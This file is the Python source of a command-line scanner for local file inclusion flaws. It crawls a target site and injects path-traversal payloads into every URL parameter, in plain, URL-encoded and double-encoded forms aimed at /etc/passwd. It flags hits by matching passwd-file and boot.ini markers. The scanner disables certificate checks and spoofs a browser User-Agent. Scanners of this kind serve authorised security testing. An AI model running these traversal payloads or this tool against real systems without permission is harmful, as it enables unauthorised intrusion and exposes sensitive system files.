import argparse
import requests
import urllib3
import json
import csv
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LFIScanner:
    def __init__(self, proxy=None, threads=10):
        self.session = self._create_session(proxy)
        self.tested_combinations = set()
        self.visited_urls = set()
        self.payloads = self._generate_payloads()
        self.vulnerabilities = []
        self.base_domain = None
        self.threads = threads
        self.executor = ThreadPoolExecutor(max_workers=threads)

    def _create_session(self, proxy):
        session = requests.Session()
        session.verify = False
        retries = Retry(total=3, backoff_factor=1,
                       status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Language': 'en-US,en;q=0.5'
        }
        if proxy:
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            session.proxies = {'http': proxy, 'https': proxy}
        return session

    def _generate_payloads(self):
        base_paths = [
            '../../../../../../../../etc/passwd',
            '....//....//....//....//etc/passwd',
            '%2e%2e%2f' * 8 + 'etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd'
        ]
        return list(set(base_paths))  # Removed wrappers

    def scan(self, start_url):
        self.base_domain = urlparse(start_url).netloc
        self._crawl(start_url)
        return self.vulnerabilities

    def _crawl(self, url):
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)

        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract all URLs from various elements
            elements = soup.find_all(['a', 'form', 'link', 'script', 'img'])
            futures = []
            
            for element in elements:
                new_url = self._extract_url(element, url)
                if new_url and new_url not in self.visited_urls:
                    futures.append(self.executor.submit(self._process_url, new_url))

            # Process current page parameters immediately
            self._analyze_parameters(url)
            
            # Process crawled URLs as they complete
            for future in as_completed(futures):
                future.result()

        except Exception as e:
            print(f"[-] Crawling error: {str(e)}")

    def _extract_url(self, element, base_url):
        attrs = {
            'a': 'href',
            'form': 'action',
            'link': 'href',
            'script': 'src',
            'img': 'src'
        }
        attr = attrs.get(element.name)
        if not attr:
            return None

        url = element.get(attr)
        if url:
            absolute_url = urljoin(base_url, url).split('#')[0]
            parsed = urlparse(absolute_url)
            if parsed.netloc == self.base_domain:
                return parsed._replace(
                    path=parsed.path.rstrip('/'),
                    query=parsed.query.strip()
                ).geturl()
        return None

    def _process_url(self, url):
        self._analyze_parameters(url)
        self._crawl(url)

    def _analyze_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            # Test each parameter with all payloads using threads
            futures = []
            for payload in self.payloads:
                combination = (parsed.path, param, payload)
                if combination not in self.tested_combinations:
                    self.tested_combinations.add(combination)
                    futures.append(
                        self.executor.submit(
                            self._test_parameter,
                            url,
                            param,
                            payload
                        )
                    )
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.vulnerabilities.append(result)

    def _test_parameter(self, original_url, param, payload):
        try:
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            query[param] = [payload]
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in query.items()]
            )).geturl()

            response = self.session.get(test_url, timeout=15)
            if self._is_vulnerable(response):
                print(f"[+] Vulnerable: {test_url}")
                return {
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }

        except Exception as e:
            print(f"[-] Test failed: {str(e)}")
        return None

    def _is_vulnerable(self, response):
        content = response.text.lower()
        indicators = [
            'root:x:0:0', 'bin:x:1:1', 'daemon:x:2:2',
            'administrator', '[boot loader]'
        ]
        return any(indicator in content for indicator in indicators)

def main():
    parser = argparse.ArgumentParser(description="Advanced LFI Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., 127.0.0.1:8080)")
    parser.add_argument("-o", "--output", help="Output format (json/csv)")
    parser.add_argument("-t", "--threads", type=int, default=10, 
                      help="Number of threads (default: 10)")
    
    args = parser.parse_args()
    
    scanner = LFIScanner(proxy=args.proxy, threads=args.threads)
    print(f"[*] Starting scan on {args.url} with {args.threads} threads")
    
    try:
        vulnerabilities = scanner.scan(args.url)
        
        if args.output:
            if args.output.lower() == 'json':
                with open('report.json', 'w') as f:
                    json.dump(vulnerabilities, f, indent=2)
            elif args.output.lower() == 'csv':
                with open('report.csv', 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['URL', 'Parameter', 'Payload', 'Status', 
                                    'Length', 'Timestamp'])
                    for vuln in vulnerabilities:
                        writer.writerow([
                            vuln['url'],
                            vuln['parameter'],
                            vuln['payload'],
                            vuln['status'],
                            vuln['length'],
                            vuln['timestamp']
                        ])
            print(f"[*] Report saved in {args.output} format")
        
        print(f"[*] Scan complete. Found {len(vulnerabilities)} vulnerabilities.")
    
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")

if __name__ == "__main__":
    main()
